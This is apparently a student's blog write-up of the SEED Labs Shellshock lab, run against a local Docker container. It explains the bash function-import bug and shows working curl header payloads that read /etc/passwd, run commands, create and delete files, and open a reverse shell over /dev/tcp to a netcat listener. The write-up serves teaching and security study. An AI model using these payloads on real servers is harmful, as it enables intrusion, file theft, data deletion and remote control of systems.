---
layout:             post
title:              "SEED Labs 2.0: Shellshock Attack Lab Writeup"
category:           "Web Applications and Cybersecurity"
tags:               networking cybersecurity container reverse-shell
permalink:          /posts/seedlabs/shellshock
last_modified_at:   "2023-04-12"
---

For general overview and the setup package for this lab, please go to [SEED Labs official website](https://seedsecuritylabs.org/Labs_20.04/Software/Shellshock/). The lab assignment was conducted using Docker Compose, which does not depend much on the SEED VM.

On September 24, 2014, a severe vulnerability was found in the <code>bash</code> program, which is used by many web servers to process CGI requests. The vulnerability allows attackers to run arbitrary commands on the affected servers. The attack is quite easy to launch, and millions of attacks and probes were recorded following the discovery of the vulnerability. It is called **Shellshock**{: style="color: red"}. [This Cloudflare's blog post](https://blog.cloudflare.com/inside-shellshock/) is a good read.

<!-- excerpt-end -->

<code>bash</code> supports exporting of shell functions to other instances of <code>bash</code> using an environment variable. This environment variable is named by the function name and starts with a "<code>() { </code>" as the variable value in the function definition. When <code>bash</code> reaches the end of the function definition, rather than ending execution it continues to process shell commands written after the end of the function. This vulnerability is especially critical because <code>bash</code> is widespread on many types of devices (UNIX-like operating systems including Linux and macOS), and because many network services utilize <code>bash</code>, causing the vulnerability to be network exploitable. Any service or program that sets environment variables controlled by an attacker and calls <code>bash</code> may be vulnerable.

The Shellshock bug starts in the <code>variables.c</code> file in the <code>bash</code> source code:
```c
void initialize_shell_variables (char **env, int privmode)
{
    ...
    for (string_index = 0; string = env[string_index++]; ) {
        ...
        /* If exported function, define it now.
           Don't import functions from the environment in privileged mode. */
        if (privmode == 0 && read_but_dont_execute == 0 && STREQN ("() {", string, 4)) {
            ...
            // Shellshock vulnerability is inside:
            parse_and_execute(temp_string, name, SEVAL_NONINT | SEVAL_NOHIST);
            ...

```
<code>bash</code> checks if there is an exported function by checking whether the value of an environment variable starts with "<code>() { </code>" or not. Once a match is found, <code>bash</code> changes the environment variable string to a function definition string by replacing the "<code>=</code>" character with a space, the calls the function <code>parse_and_execute()</code> to parse the function definition. If the string contains a shell command, the parsing function will execute it; if the string contains two commands, separated by a semicolon ("<code>;</code>"), the <code>parse_and_execute()</code> function will process both commands. The attack consequence is the following: if attackers add some extra commands at the end of a function declaration, and if they can find a way to pass this function declaration via an environment variable to a target process running <code>bash</code>, they can get the target process to run their commands. If the target process is a server process or runs with a privilege, security breaches can occur.

## Table of Contents
{:.no_toc}
* TOC 
{:toc}

## Environment Setup

### DNS Setting

Please add the following to <code>/etc/hosts</code>, which is the hosts file that maps domain names (<code>hostnames</code>) to IP addresses. You need to use the root privilege to modify this file:
```console
$ sudo vim /etc/hosts

127.0.0.1 localhost

# The following lines are desirable for IPv6 capable hosts
::1 ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
ff02::3 ip6-allhosts

# SEED 2.0 Shellshock
10.9.0.80 www.seedlab-shellshock.com
```

In most DNS-related labs, we need to configure the user VM or container to use the local DNS server in our setup. The provided SEED VM uses the Dynamic Host Configuration Protocol (DHCP) to obtain network configuration parameters, such as IP address, local DNS server, etc. DHCP clients will overwrite the <code>/etc/resolv.conf</code> file (the entries of which determine what local DNS server will be used) with the information provided by the DHCP server. One way to get our information into <code>/etc/resolv.conf</code> without worrying about the DHCP is to add the following entry to the <code>/etc/resolvconf/resolv.conf.d/head</code> file:
```console
$ sudo nano /etc/resolvconf/resolv.conf.d/head
$ cat /etc/resolvconf/resolv.conf.d/head
# Dynamic resolv.conf(5) file for glibc resolver(3) generated by resolvconf(8)
#     DO NOT EDIT THIS FILE BY HAND -- YOUR CHANGES WILL BE OVERWRITTEN
# 127.0.0.53 is the systemd-resolved stub resolver.
# run "systemd-resolve --status" to see details about the actual nameservers.

nameserver 10.9.0.53
```
The content of the head file will be prepended to the dynamically generated resolver configuration file. Normally, this is just a comment line. After making the change, we need to run the following command for the change to take effect:
```console
$ sudo resolvconf -u
$ cat /etc/resolv.conf
# Dynamic resolv.conf(5) file for glibc resolver(3) generated by resolvconf(8)
#     DO NOT EDIT THIS FILE BY HAND -- YOUR CHANGES WILL BE OVERWRITTEN
# 127.0.0.53 is the systemd-resolved stub resolver.
# run "systemd-resolve --status" to see details about the actual nameservers.

nameserver 10.9.0.53
nameserver 127.0.0.53
search ec2.internal
```

### Container Setup and Commands

Docker can build images automatically by reading the instructions from a Dockerfile, which is a text file that contains all commands needed to build a container image:
```console
[October 20 2022] seed@xingjian:~/Documents/cse523s/shellshock/image_www$ cat Dockerfile
FROM handsonsecurity/seed-server:apache-php

COPY bash_shellshock /bin/
COPY vul.cgi getenv.cgi /usr/lib/cgi-bin/
COPY server_name.conf  /etc/apache2/sites-available
RUN  chmod 755 /bin/bash_shellshock \
     && chmod 755 /usr/lib/cgi-bin/*.cgi  \
     && a2ensite server_name.conf  

CMD service apache2 start && tail -f /dev/null
```

All the SEED Labs will use Compose to set up its container-based lab environments. Download and unzip the <code>Labsetup.zip</code> file and enter the folder. Use the <code>docker-compose.yml</code> file inside <code>Labsetup</code> to set up the lab environment:
```yaml
version: "3"

services:
    victim:
        build: ./image_www
        image: seed-image-www-shellshock
        container_name: victim-10.9.0.80
        tty: true
        networks:
            net-10.9.0.0:
                ipv4_address: 10.9.0.80
                  

networks:
    net-10.9.0.0:
        name: net-10.9.0.0
        ipam:
            config:
                - subnet: 10.9.0.0/24
```
The <code>services</code> section list all the containers that we want to build and run. The <code>networks</code> section lists all the networks that we need to create.

```bash
$ docker-compose build              # Build the container image
$ docker-compose up                 # Start the container
$ docker-compose down               # Shut down the container
$ docker ps                         # Find out the ID of the running containers
$ docker ps -a                      # Find out the ID of all the containers
$ docker exec -it <id> /bin/bash    # Start a shell on a running container
$ docker rm <id>                    # Remove a container
```

We can use the following command to build the containers first:
```console
[October 20 2022] seed@xingjian:~/Documents/cse523s/Shellshock$ docker-compose build
Building victim
Step 1/6 : FROM handsonsecurity/seed-server:apache-php
apache-php: Pulling from handsonsecurity/seed-server
da7391352a9b: Pull complete
14428a6d4bcd: Pull complete
2c2d948710f2: Pull complete
d801bb9d0b6c: Pull complete
Digest: sha256:fb3b6a03575af14b6a59ada1d7a272a61bc0f2d975d0776dba98eff0948de275
Status: Downloaded newer image for handsonsecurity/seed-server:apache-php
 ---> 2365d0ed3ad9
Step 2/6 : COPY bash_shellshock /bin/
 ---> bdf6137cf5cb
Step 3/6 : COPY vul.cgi getenv.cgi /usr/lib/cgi-bin/
 ---> 791252998093
Step 4/6 : COPY server_name.conf  /etc/apache2/sites-available
 ---> b65e7015c67e
Step 5/6 : RUN  chmod 755 /bin/bash_shellshock      && chmod 755 /usr/lib/cgi-bin/*.cgi       && a2ensite server_name.conf
 ---> Running in c9c774e20a97
Enabling site server_name.
To activate the new configuration, you need to run:
  service apache2 reload
Removing intermediate container c9c774e20a97
 ---> 953adf36f6f4
Step 6/6 : CMD service apache2 start && tail -f /dev/null
 ---> Running in 3c3ead9652c4
Removing intermediate container 3c3ead9652c4
 ---> 50da4f699f9e

Successfully built 50da4f699f9e
Successfully tagged seed-image-www-shellshock:latest
```

We can run Compose's <code>up</code> command to start all the containers specified in the <code>docker-compose.yml</code> file. Make sure to run this command in the same folder as <code>docker-compose.yml</code>:
```console
[October 20 2022] seed@xingjian:~/Documents/cse523s/Shellshock$ docker-compose up
Creating network "net-10.9.0.0" with the default driver
Creating victim-10.9.0.80 ... done
Attaching to victim-10.9.0.80
victim-10.9.0.80 |  * Starting Apache httpd web server apache2                   * 
^CGracefully stopping... (press Ctrl+C again to force)
Stopping victim-10.9.0.80 ... done
[October 20 2022] seed@xingjian:~/Documents/cse523s/Shellshock$ dcup -d
Starting victim-10.9.0.80 ... done
[October 20 2022] seed@xingjian:~/Documents/cse523s/Shellshock$ docker ps
CONTAINER ID   IMAGE                       COMMAND                  CREATED          STATUS          PORTS     NAMES
ba1d1a573167   seed-image-www-shellshock   "/bin/sh -c 'service…"   15 minutes ago   Up 20 seconds             victim-10.9.0.80
[October 20 2022] seed@xingjian:~/Documents/cse523s/Shellshock$ docksh
"docker exec" requires at least 2 arguments.
See 'docker exec --help'.

Usage:  docker exec [OPTIONS] CONTAINER COMMAND [ARG...]

Run a command in a running container
[October 20 2022] seed@xingjian:~/Documents/cse523s/Shellshock$ docksh ba
root@ba1d1a573167:/# ls
bin  boot  dev  etc  home  lib  lib32  lib64  libx32  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
```

### Web Server and CGI

In this lab, we will launch a Shellshock attack on the web server container. Many web servers enable [CGI ("Common Gateway Interface")](https://datatracker.ietf.org/doc/html/rfc3875), which is a standard method used to generate dynamic content on web pages and for web applications. Many CGI programs are shell scripts, so before the actual CGI program runs, a shell program will be invoked first, and such an invocation is triggered by users from remote computers. If the shell program is a vulnerable bash program, we can exploit the Shellshock vulnerable to gain privileges on the server.

In our web server container, we have already set up a very simple CGI program (called "<code>vul.cgi</code>"):
```bash
#!/bin/bash_shellshock

echo "Content-type: text/plain"
echo
echo
echo "Hello World"
```
It simply prints out "Hello World" using a shell script:
```console
$ curl http://www.seedlab-shellshock.com/cgi-bin/vul.cgi

Hello World
```

## Lab Tasks

### Task 1: Experimenting with Bash Function

We have installed a vulnerable version of bash inside the container. The program can also be found in the <code>Labsetup</code> folder. Its name is <code>bash_shellshock</code>. Please design an experiment to verify whether this bash is vulnerable to the Shellshock attack or not. Conduct the same experiment on the patched version <code>/bin/bash</code> and report your observations.

**Ans:** For our designated command below, when we run <code>/bin/bash</code>, the shell only outputs "<code>this is a test</code>"; however, when we run <code>/bin/bash_shellshock</code>, our injected environment variable is printed out as well.
```console
root@ba1d1a573167:/# env x='() { :;}; echo vulnerable' bash_shellshock -c "echo this is a test"
vulnerable
this is a test
root@ba1d1a573167:/# env x='() { :;}; echo vulnerable' bash -c "echo this is a test"
this is a test
```

### Task 2: Passing Data to Bash via Environment Variable

To exploit a Shellshock vulnerability in a <code>bash</code>-based CGI program, attackers need to pass their data to the vulnerable <code>bash</code> program, and the data need to be passed via an environment variable. In this task, we need to see how we can achieve this goal. We have provided another CGI program (<code>getenv.cgi</code>) on the server, which prints out all its environment variables:
```bash
#!/bin/bash_shellshock

echo "Content-type: text/plain"
echo
echo "****** Environment Variables ******"
strings /proc/$$/environ
```

#### Task 2.A: Using Browser

Please identify which environment variable(s)' values are set by the browser.

**Ans:** The <code>User-Agent</code> field indicates that the client is Firefox.

#### Task 2.B: Using <code>curl</code>

Here are some of the useful options:
- the <code>-v</code> field can print out the header of the HTTP request;
- the <code>-A</code>, <code>-e</code>, and <code>-H</code> options can set some fields in the header request.
Figure out what fields are set by each of them.

**Ans:**
```console
[October 20 2022] seed@xingjian:~$ curl http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi
****** Environment Variables ******
HTTP_HOST=www.seedlab-shellshock.com
HTTP_USER_AGENT=curl/7.68.0
HTTP_ACCEPT=*/*
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
SERVER_SIGNATURE=<address>Apache/2.4.41 (Ubuntu) Server at www.seedlab-shellshock.com Port 80</address>
SERVER_SOFTWARE=Apache/2.4.41 (Ubuntu)
SERVER_NAME=www.seedlab-shellshock.com
SERVER_ADDR=10.9.0.80
SERVER_PORT=80
REMOTE_ADDR=10.9.0.1
DOCUMENT_ROOT=/var/www/html
REQUEST_SCHEME=http
CONTEXT_PREFIX=/cgi-bin/
CONTEXT_DOCUMENT_ROOT=/usr/lib/cgi-bin/
SERVER_ADMIN=webmaster@localhost
SCRIPT_FILENAME=/usr/lib/cgi-bin/getenv.cgi
REMOTE_PORT=33900
GATEWAY_INTERFACE=CGI/1.1
SERVER_PROTOCOL=HTTP/1.1
REQUEST_METHOD=GET
QUERY_STRING=
REQUEST_URI=/cgi-bin/getenv.cgi
SCRIPT_NAME=/cgi-bin/getenv.cgi
```

Using
```bash
curl -A "my data" -v www.seedlab-shellshock.com/cgi-bin/getenv.cgi
```
The <code>HTTP_USER_AGENT</code> field is set to <code>my data</code>. The purpose of this field, the value of which is taken from the header of the HTTP request (<code>User-Agent</code>), is to provide some information about the client, to help the server customize its contents for individual client or browser types. The original client is <code>curl</code>.

<code>Apache</code> gets the user agent information from the header of the HTTP request and assigns it to <code>HTTP_USER_AGENT</code>. When <code>Apache</code> forks a child process to execute the CGI program, it passes this variable, along with many other environment variables, to the CGI program.

Using
```bash
curl -e "my data" -v www.seedlab-shellshock.com/cgi-bin/getenv.cgi
```
The <code>HTTP_REFERER</code> field is set to <code>my data</code>.

Using
```bash
curl -H "AAAAAA: BBBBBB" -v www.seedlab-shellshock.com/cgi-bin/getenv.cgi
```
A new <code>HTTP_AAAAAA</code> field is added and assigned with <code>BBBBBB</code>.

These three options can all be used to inject data into the environment variables of the target CGI program.

### Task 3: Launching the Shellshock Attack

We can now launch the Shellshock attack. The attack does not depend on what is in the CGI program, as it targets the bash program, which is invoked before the actual CGI script is executed. Our job is to launch the attack through the URL [http://www.seedlab-shellshock.com/cgi-bin/vul.cgi](http://www.seedlab-shellshock.com/cgi-bin/vul.cgi), so we can get the server to run an arbitrary command. Please use three different approaches (i.e., three different HTTP header fields) to launch the Shellshock attack against the target CGI program.

Whatever the CGI program prints out will go to the <code>Apache</code> server, which in turn sends the data back to the client. <code>Apache</code> needs to know the type of the content: text, multi-media, or other types. If the output is text, we can tell <code>Apache</code> the data type by including "<code>Content_type: text/plain</code>", followed by an empty line.

#### Task 3.A: Get the server to send back the content of the <code>/etc/passwd</code> file.

**Ans:** Below is the commands I used, including those waking up the Docker:
```console
[October 29 2022] seed@xingjian:~/Documents/cse523s/Shellshock$ dcup -d
Creating network "net-10.9.0.0" with the default driver
Creating victim-10.9.0.80 ... done
[October 29 2022] seed@xingjian:~/Documents/cse523s/Shellshock$ docker ps
CONTAINER ID   IMAGE                       COMMAND                  CREATED          STATUS         PORTS     NAMES
adb5168e1e79   seed-image-www-shellshock   "/bin/sh -c 'service…"   11 seconds ago   Up 9 seconds             victim-10.9.0.80
[October 29 2022] seed@xingjian:~/Documents/cse523s/Shellshock$ docksh ad
root@adb5168e1e79:/# curl -A "() { echo vulnerable; }; echo Content_type: text/pain; echo; /bin/cat /etc/passwd" http://www.seedlab-shellshock.com/cgi-bin/vul.cgi
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
```
I obtained the same results if I replace <code>-A</code> with <code>-e</code> or <code>-H</code>.

#### Task 3.B: Get the server to tell you its process' user ID.

You can use the <code>/bin/id</code> command to print out the ID information.

**Ans:** Below is the commands I used:
```console
root@adb5168e1e79:/# curl -e "() { echo vulnerable; }; echo Content_type: text/plain; echo; /bin/id" http://www.seedlab-shellshock.com/cgi-bin/vul.cgi
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
I obtained the same results if I replace <code>-e</code> with <code>-A</code> or <code>-H</code>.

#### Task 3.C: Get the server to create a file inside the <code>/tmp</code> folder.

You need to get into the container to see whether the file is created or not, or use another Shellshock attack to list the <code>/tmp</code> folder.

**Ans:** Below is the commands I used:
```console
root@adb5168e1e79:/# curl -A "() { echo vulnerable; }; echo Content_type: text/plain; echo; /bin/touch /tmp/task-3c" http://www.seedlab-shellshock.com/cgi-bin/vul.cgi
root@adb5168e1e79:/# ls -l /tmp
total 0
-rw-r--r-- 1 www-data www-data 0 Oct 29 23:30 task-3c
root@adb5168e1e79:/# curl -e "() { echo vulnerable; }; echo Content_type: text/plain; echo; /bin/touch /tmp/task-3c-2" http://www.seedlab-shellshock.com/cgi-bin/vul.cgi
root@adb5168e1e79:/# ls -l /tmp
total 0
-rw-r--r-- 1 www-data www-data 0 Oct 29 23:30 task-3c
-rw-r--r-- 1 www-data www-data 0 Oct 29 23:31 task-3c-2
root@adb5168e1e79:/# curl -H "() { echo vulnerable; }; echo Content_type: text/plain; echo; /bin/touch /tmp/task-3c-3" http://www.seedlab-shellshock.com/cgi-bin/vul.cgi
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>400 Bad Request</title>
</head><body>
<h1>Bad Request</h1>
<p>Your browser sent a request that this server could not understand.<br>
</p>
<hr>
<address>Apache/2.4.41 (Ubuntu) Server at www.seedlab-shellshock.com Port 80</address>
</body></html>
root@adb5168e1e79:/# curl -H "var: () { echo vulnerable; }; echo Content_type: text/plain; echo; /bin/touch /tmp/task-3c-3" http://www.seedlab-shellshock.com/cgi-bin/vul.cgi 
root@adb5168e1e79:/# ls -l /tmp
total 0
-rw-r--r-- 1 www-data www-data 0 Oct 29 23:30 task-3c
-rw-r--r-- 1 www-data www-data 0 Oct 29 23:31 task-3c-2
-rw-r--r-- 1 www-data www-data 0 Oct 29 23:34 task-3c-3
```

#### Task 3.D: Get the server to delete the file that you just created inside the <code>/tmp</code> folder.

**Ans:** Below is the commands I used:
```console
root@adb5168e1e79:/# curl -H "remove: () { echo vulnerable; }; echo Content_type: text/plain; echo; /bin/find /tmp -type f -delete" http://www.seedlab-shellshock.com/cgi-bin/vul.cgi
root@adb5168e1e79:/# ls -l /tmp
total 0
```

#### Questions.

Please answer the following questions:
- Question 1: Will you be able to steal the content of the shadow file <code>/etc/shadow</code> from the server? Why or why not?
- Question 2: HTTP GET requests typically attach data in the URL, after the <code>?</code> mark. This could be another approach that we can use to launch the attack. In the following example, we attach some data in the URL, and we found that the data are used to set an environment variable:
    ```console
    $ curl "http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi?AAAAA"
    ...
    QUERY_STRING=AAAAA
    ...
    ```
    Can we use this method to launch the Shellshock attack? Please conduct your experiment and derive your conclusions based on your experiment results.

**Ans:** For Question 1, we cannot "<code>/bin/cat</code>" the shadow directory because we are not accessing it as a root or super user. For Question 2, I chose to use the <code>env</code> command to pass a query string to a variable that will be placed after the question mark:
```console
root@adb5168e1e79:/# env x='() { echo vulnerable; }; echo Content_type: text/plain; echo; /bin/cat /etc/passwd' bash_shellshock -c "curl 'http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi?$x'"
Content_type: text/plain

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
Segmentation fault (core dumped)
root@adb5168e1e79:/# env x='() { echo vulnerable; }; /bin/id' bash_shellshock -c "curl 'http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi?$x'"
uid=0(root) gid=0(root) groups=0(root)
Segmentation fault (core dumped)
root@adb5168e1e79:/# env x='() { echo vulnerable; }; /bin/touch /tmp/task3;' bash_shellshock -c "curl 'http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi?$x'"
Segmentation fault (core dumped)
root@adb5168e1e79:/# ls -l /tmp
total 0
-rw-r--r-- 1 root root 0 Oct 30 00:33 task3
root@adb5168e1e79:/# env x='() { echo vulnerable; }; /bin/find /tmp -type f -delete' bash_shellshock -c "curl 'http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi?$x'"
Segmentation fault (core dumped)
root@adb5168e1e79:/# ls -l /tmp
total 0
```

### Task 4: Getting a Reverse Shell via Shellshock Attack

The Shellshock vulnerability allows attacks to run arbitrary commands on the target machine. In real attacks, instead of hard-coding the command in the attack, attackers often choose to run a shell command, so they can use this shell to run other commands, for as long as the shell program is alive. To achieve this goal, attackers need to run a reverse shell[^1]. Demonstrate how you can get a reverse shell from the victim using the Shellshock attack.

**Ans:** For this task, we need two terminal windows, one running the `netcat` utility and the other running the shell command. After I ran <code>nc -v -l 9090</code>, I received the error message: "<code>getnameinfo: Temporary failure in name resolution</code>". I then appended the `-n` option:
```console
# In the first terminal window:
$ nc -nv -l 9090
Listening on 0.0.0.0 9090

# In the second terminal window:
$ curl -A "() { echo vulnerable; }; echo Content_type: text/plain; echo; echo; /bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1" http://www.seedlab-shellshock.com/cgi-bin/vul.cgi

```

The second terminal window kept spinning, and a reverse shell was created in the first terminal window:

```console
Connection received on 10.9.0.80 52520
bash: cannot set terminal process group (32): Inappropriate ioctl for device
bash: no job control in this shell
www-data@54b33eb364c0:/usr/lib/cgi-bin$
```

## Notes

[^1]: Reverse shell is a shell process started on a machine, with its input and output being controlled by somebody from a remote computer. Basically, the shell runs on the victim's machine, but it takes input from the attacker machine and also prints its output on the attacker's machine. Reverse shell gives attackers a convenient way to run commands on a compromised machine. The key idea of reverse shell is to redirects its standard input, output, and error devices to a network connection, so the shell gets its input from the connection, and prints out its output also to the connection. At the other end of the connection is a program run by the attacker; the program simply displays whatever comes from the shell at the other end, and sends whatever is typed by the attacker to the shell, over the network connection.